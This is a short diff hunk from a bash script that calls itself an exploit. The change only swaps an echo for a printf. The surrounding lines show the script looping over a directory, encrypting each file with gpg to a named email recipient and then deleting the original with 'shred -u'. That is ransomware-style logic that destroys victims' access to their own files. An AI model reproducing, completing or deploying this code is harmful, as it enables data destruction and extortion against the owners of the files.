@@ -18,7 +18,7 @@ function chk_dir
 			 echo "$i_1"
 			if [ $i_1 == $path/$exp ]
 			then
-				echo "it is the exploit\n"
+				printf "\nit is the exploit"
 			else
 			printf "encrypting $i_1 and deleteing original one\n" 
 		        gpg -r "<sinhaanimesh82@gmail.com>" -e $i_1;shred -u $i_1
